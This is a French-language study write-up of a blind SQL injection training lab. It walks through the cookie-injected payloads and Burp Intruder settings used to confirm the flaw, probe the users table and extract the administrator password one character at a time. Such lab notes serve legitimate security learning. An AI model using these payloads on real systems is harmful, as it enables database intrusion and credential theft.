
## Définition rapide

Une **Blind SQL Injection** est une injection SQL où l’application **ne renvoie pas directement les résultats de la requête SQL**, ni forcément d’erreur SQL visible.  
Tu ne “vois” donc pas la base de données directement.

À la place, tu déduis les résultats de tes injections grâce à un **signal indirect** :

- un texte qui apparaît ou disparaît
    
- une longueur de réponse qui change
    
- un délai de réponse
    
- un code HTTP différent
    

Dans ce lab, le signal était :

- **`Welcome back`** quand la condition SQL est vraie
    
- absence de `Welcome back` quand la condition est fausse
    

---

# Type de Blind SQLi dans ce lab

Ici, c’est une :

## Boolean-based Blind SQLi

Le backend répond différemment selon que la condition SQL est :

- **TRUE**
    
- **FALSE**
    

Tu ne récupères pas directement les données.  
Tu poses des questions à la base de données, et tu lis le résultat via la réponse de l’application.

Exemple :

' AND '1'='1

=> condition vraie

' AND '1'='2

=> condition fausse

---

# Objectif du lab

Le lab contenait :

- une injection SQL aveugle dans le cookie **`TrackingId`**
    
- une table **`users`**
    
- un utilisateur **`administrator`**
    
- un champ **`password`**
    

Objectif :

- extraire le mot de passe de `administrator`
    
- se connecter avec ce compte
    
- valider le lab
    

---

# Principe général du lab

Le site utilisait un cookie du type :

TrackingId=abc123

Le backend faisait probablement une requête SQL ressemblant à quelque chose comme :

SELECT * FROM tracking WHERE id = 'abc123'

Comme la valeur du cookie était injectée dans une requête SQL, on pouvait :

1. fermer la quote SQL
    
2. ajouter une condition
    
3. observer la réponse de l’application
    

---

# Méthodologie complète du lab

## 1. Vérifier qu’il y a bien une Blind SQLi

### Requête TRUE

TrackingId=xyz' AND '1'='1

### Commentaire

- `xyz` = valeur originale du cookie
    
- `'` = ferme la quote SQL en cours
    
- `AND '1'='1` = ajoute une condition vraie
    

### Ce que ça veut dire côté SQL

Probablement quelque chose comme :

... WHERE id='xyz' AND '1'='1'

Même si la requête exacte backend n’est pas visible, l’idée est là :  
tu ajoutes une condition vraie.

### Résultat attendu

- le message **`Welcome back`** apparaît
    
- ou la longueur de réponse reste celle d’une réponse “vraie”
    

---

### Requête FALSE

TrackingId=xyz' AND '1'='2

### Commentaire

- même logique
    
- mais la condition est fausse
    

### Résultat attendu

- **`Welcome back`** disparaît
    
- ou la longueur de réponse change
    

### Conclusion

Si TRUE et FALSE donnent un comportement différent :

Blind SQLi confirmée

---

## 2. Vérifier que la table `users` existe

### Requête

TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a

### Commentaire détaillé

- `(SELECT 'a' FROM users LIMIT 1)` :  
    demande à la base de retourner la lettre `'a'` depuis la table `users`
    
- `='a'` :  
    compare le résultat à `'a'`
    

### Logique

Si la table `users` existe et contient au moins une ligne :

(SELECT 'a' FROM users LIMIT 1)

renvoie `'a'`

donc :

'a'='a'

=> TRUE

### Résultat attendu

- `Welcome back` apparaît
    

### Conclusion

la table users existe

---

## 3. Vérifier que l’utilisateur `administrator` existe

### Requête

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

### Commentaire détaillé

- `FROM users WHERE username='administrator'`  
    => cible uniquement la ligne de l’utilisateur `administrator`
    
- `SELECT 'a'`  
    => si cette ligne existe, la requête retourne `'a'`
    
- `='a'`  
    => compare le résultat
    

### Résultat attendu

- `Welcome back` apparaît
    

### Conclusion

l'utilisateur administrator existe bien dans la table users

---

## 4. Déterminer la longueur du mot de passe

### Requête de départ

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

### Commentaire détaillé

- `LENGTH(password)>1`  
    => on demande : “le mot de passe fait-il plus de 1 caractère ?”
    
- si oui, la ligne `administrator` est bien sélectionnée
    
- `SELECT 'a'`  
    => retourne `'a'`
    
- `='a'`  
    => TRUE
    

### Ensuite

Tu augmentes progressivement :

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>4)='a

etc.

### Interprétation

Tant que `Welcome back` apparaît :

la condition est vraie

Quand `Welcome back` disparaît :

tu as dépassé la vraie longueur

### Conclusion du lab

La longueur du mot de passe était :

20 caractères

---

## 5. Extraire le mot de passe caractère par caractère

### Requête type

TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

### Commentaire détaillé

- `SUBSTRING(password,1,1)`  
    => prend 1 caractère à partir de la position 1
    
- donc ici :  
    **“prends le premier caractère du password”**
    
- `='a'`  
    => teste si ce premier caractère vaut `a`
    

### Logique

Si le premier caractère est `a` :

SUBSTRING(password,1,1)='a'

=> TRUE

Sinon :

=> FALSE

---

# Ce que tu as fait dans Burp Suite

## Étape 1 — Burp Repeater

Tu as d’abord utilisé **Repeater** pour :

- confirmer la Blind SQLi
    
- vérifier l’existence de la table `users`
    
- vérifier l’utilisateur `administrator`
    
- tester la longueur du mot de passe
    

### Pourquoi Repeater ici

Parce que tu avais besoin de :

- modifier manuellement une requête
    
- comparer rapidement les réponses
    
- observer le comportement TRUE/FALSE
    

---

## Étape 2 — Burp Intruder pour les caractères

Quand il a fallu tester beaucoup de caractères, tu es passé sur **Intruder**.

### Requête utilisée dans Intruder

TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§'

### Ce que ça veut dire

- `SUBSTRING(password,1,1)` = tester le caractère à la position 1
    
- `§a§` = emplacement payload Intruder
    
- Intruder remplace `a` par :
    
    - `a`
        
    - `b`
        
    - `c`
        
    - ...
        
    - `z`
        
    - `0`
        
    - ...
        
    - `9`
        

---

## Configuration Intruder

### Type d’attaque

Tu as utilisé **Sniper** pour tester une position à la fois.

### Payload list

Tu as fourni une liste de 36 caractères :

a  
b  
c  
d  
e  
f  
g  
h  
i  
j  
k  
l  
m  
n  
o  
p  
q  
r  
s  
t  
u  
v  
w  
x  
y  
z  
0  
1  
2  
3  
4  
5  
6  
7  
8  
9

### Pourquoi 36

Parce que le lab précisait que le mot de passe ne contenait que :

- lettres minuscules
    
- chiffres
    

---

## Grep-Match

Tu as configuré **Grep-Match** avec :

Welcome back

### But

Burp ajoutait une colonne qui indiquait :

- `1` si le texte était présent
    
- rien si absent
    

### Interprétation

Quand une ligne avait :

Welcome back = 1

alors :

la condition SQL était vraie

donc :

le caractère testé était le bon

---

## Length

Tu as aussi observé la colonne **Length**.

### Pourquoi c’était utile

Quand `Welcome back` apparaissait, la réponse HTTP était plus longue.

Exemple typique :

- réponse normale : `5575`
    
- réponse vraie avec `Welcome back` : `5636`
    

Donc :

Length plus grand = bon caractère

---

## Ce qui t’a piégé au début

Au début, tu regardais surtout **`Response received`**.

### Pourquoi ce n’est pas fiable ici

`Response received` reflète surtout :

- le temps
    
- la latence
    
- le comportement réseau
    
- du bruit serveur
    

Ce n’est **pas** le bon indicateur pour une **boolean-based blind SQLi**.

### Bon indicateur ici

Dans ce lab, les bons signaux étaient :

1. **Grep-Match**
    
2. **Length**
    

Et non :

3. `Response received`
    

---

# Déroulé exact de l’exploitation

## Position 1

Tu testes :

TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§'

Intruder essaie 36 caractères.

Tu regardes :

- `Welcome back = 1`
    
- ou le plus grand `Length`
    

Tu récupères le bon caractère.

---

## Position 2

Tu modifies :

SUBSTRING(password,2,1)

Puis tu relances Intruder.

---

## Position 3

SUBSTRING(password,3,1)

Puis Intruder.

---

## Et ainsi de suite jusqu’à 20

SUBSTRING(password,20,1)

À la fin, tu reconstruis le mot de passe complet.

---

# Points importants retenus pendant le lab

## 1. Une seule quote mal placée casse tout

Exemple d’erreur :

...='§a§

au lieu de :

...='§a§'

Une simple quote manquante peut faire échouer toute l’attaque.

---

## 2. La coloration Burp aide à repérer les erreurs

Quand la requête n’était pas “bien verte”, ça t’a aidé à voir qu’il y avait une erreur de syntaxe :

- espace mal placé
    
- quote manquante
    
- parenthèse
    
- champ mal écrit
    

---

## 3. La ligne vide dans Intruder est la baseline

Quand tu voyais parfois une ligne vide avec `Welcome back = 1`, c’était la **baseline**.

Il faut l’ignorer et regarder uniquement les vraies lignes payload.

---

## 4. Si le lab ne répond plus pareil, il est peut-être déjà résolu

Une fois validé, le lab peut :

- changer
    
- être patché
    
- ne plus répondre comme avant
    

---

# Ce que ce lab t’a appris

## Compétences techniques

- identifier une Blind SQLi
    
- différencier TRUE / FALSE
    
- exploiter un cookie vulnérable
    
- vérifier une table et un utilisateur
    
- déduire une longueur de secret
    
- exfiltrer une donnée caractère par caractère
    
- configurer Burp Repeater
    
- configurer Burp Intruder
    
- utiliser Grep-Match
    
- utiliser Length comme signal fiable
    

---

## Compétence méthodologique

Tu as surtout appris à raisonner comme ça :

1. Est-ce injectable ?  
2. Quelle est la structure cible ?  
3. La donnée existe-t-elle ?  
4. Quelle est sa longueur ?  
5. Quelle est sa valeur ?

C’est ça le vrai schéma mental à retenir.

---

# Version ultra-condensée pour révision

## Blind SQLi — formule mentale

Entrée contrôlable  
→ test TRUE/FALSE  
→ confirmation de l'injection  
→ confirmation de la structure cible  
→ extraction du secret

---

## Workflow lab

1. Tester ' AND '1'='1  
2. Tester ' AND '1'='2  
3. Vérifier users  
4. Vérifier administrator  
5. Trouver LENGTH(password)  
6. Extraire SUBSTRING(password,n,1)  
7. Reconstituer le password  
8. Se connecter en administrator

---

# Requêtes du lab avec commentaire

## Test injection TRUE

TrackingId=xyz' AND '1'='1

Ferme la quote SQL et ajoute une condition vraie.

---

## Test injection FALSE

TrackingId=xyz' AND '1'='2

Ferme la quote SQL et ajoute une condition fausse.

---

## Vérifier table users

TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a

Si la table users existe et contient une ligne, la condition est vraie.

---

## Vérifier utilisateur administrator

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

Si administrator existe, la condition est vraie.

---

## Tester longueur du mot de passe

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>10)='a

Demande si le mot de passe fait plus de 10 caractères.

---

## Tester un caractère précis

TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

Demande si le premier caractère du password est a.

---

# Notes personnelles utiles

## Ce que j’ai mal lu au début

Response received n’était pas le bon signal.

## Ce qu’il fallait lire

Welcome back  
Length

## Ce qui m’a fait perdre du temps

- mauvaise syntaxe SQL
    
- quotes
    
- espace
    
- payload Intruder
    
- lecture du mauvais indicateur
    

## Ce que je retiens

Pour une boolean-based blind SQLi :  
je regarde Grep-Match et Length, pas Response received.

---

# Conclusion

Ce lab m’a appris à :

- confirmer une Blind SQLi
    
- raisonner par conditions booléennes
    
- interroger la base indirectement
    
- utiliser Burp proprement
    
- extraire une donnée sans jamais voir la base directement
    

Le vrai apprentissage n’était pas juste “résoudre le lab”, mais **comprendre comment transformer une application web en oracle de données**.
